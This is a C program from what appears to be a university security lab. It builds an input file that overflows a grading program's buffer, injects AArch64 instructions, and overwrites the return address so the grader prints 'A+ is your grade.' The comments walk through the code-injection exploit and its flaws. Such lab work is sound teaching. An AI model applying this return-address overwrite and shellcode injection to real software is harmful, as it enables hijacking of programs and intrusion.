/*--------------------------------------------------------------------*/
/* createdataAplus.c                                                  */
/* Author: William Svoboda and Will Drury                             */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include <string.h>
#include "miniassembler.h"

/* Write our names to a file named dataAplus, followed by 3 null bytes.
   this ensures that when the 12 bytes of assembly instructions are 
   written next, that they are on addresses that are multiples of 4.
   then write to the file the string "A+ is your grade.%c" followed by
   10 more null bytes in order to fill up buf. Finally overwrite X30
   by writing to the file the address of the first instruction in BSS
   that we want to jump to. Return 0. */

/* EXPLANATION FOR IMPERFECT A+ ATTACK BEHAVIOR:
   
   Our approach works by using 12 bytes worth of three assembly
   instructions. The first instruction moves the address of a string 
   stored later in BSS into X0. The next instruction moves the value
   of the newline character into X1. These instructions prep the 
   parameters needed for the print statement. The third instruction 
   jumps to the last address associated with the first print
   statement in main, where it gives the student their grade. Instead 
   of using the grader's intended string, however, we were able to have
   the print statement go to our own string which gives us an A+. There
   is a %c in this string as well that is meant to take advantage of
   the newline value we moved into X1. The reason we took this 
   roundabout way of printing a newline was to compensate for the chance
   that reading in a newline during the first for loop in readString() 
   would break upon reading a newline character. In any case, our group
   used GDB  to trace through grader when ran with dataAplus. We can 
   confirm that although both X0 and X1 have their intended values, 
   there seems to be some kind of system error as 
   " _dl_runtime_resolve () from /lib/ld-linux-aarch64.so.1" is called
   and thousands of lines of assembly code are run. An earlier approach
   of including the newline character in the string did not work as 
   well. As it stands, our program outputs the correct characters minus 
   the newline seen in the correct behavior. */

int main(void)
{
   unsigned long ulData; /* the address with which to overwrite X30 */
   int i;
   unsigned int adrAplus; /* adr X1, (address in BSS of new string) */
   unsigned int movNewLine; /* mov W0, '\n' */
   unsigned int bPrint; /* b (address of last instruction in printf) */

   /* open the file */
   FILE *psFile;
   psFile = fopen("dataAplus", "w");

   /* write our names to the file */
   fprintf(psFile, "Wills"); /* writes 5 bytes to file */

   /* write 3 bytes to the file */
   for (i = 0; i < 3; i++)
      putc(0x00, psFile); /* writes 00000000 */

   /* write 12 bytes of assembly instructions and fill up buf */
   adrAplus = MiniAssembler_adr(0x0, 0x42006c, 0x420060);
   fwrite(&adrAplus, sizeof(unsigned int), 1, psFile);

   movNewLine = MiniAssembler_mov(0x1, '\n');
   fwrite(&movNewLine, sizeof(unsigned int), 1, psFile);

   bPrint = MiniAssembler_b(0x400874, 0x420068);
   fwrite(&bPrint, sizeof(unsigned int), 1, psFile);

   /* write the new string to the file */
   fprintf(psFile, "A+ is your grade.%c"); /* 19 bytes */

   /* bytes to the file  */
   for (i = 0; i < 10; i++)
      putc(0x00, psFile); /* writes 00000000 */

   /* write the address of the first instruction of our code in BSS to 
      overwrite x30 */
   ulData = 0x420060;
   fwrite(&ulData, sizeof(unsigned long), 1, psFile);

   /* close the file */
   fclose(psFile);

   return 0;
}
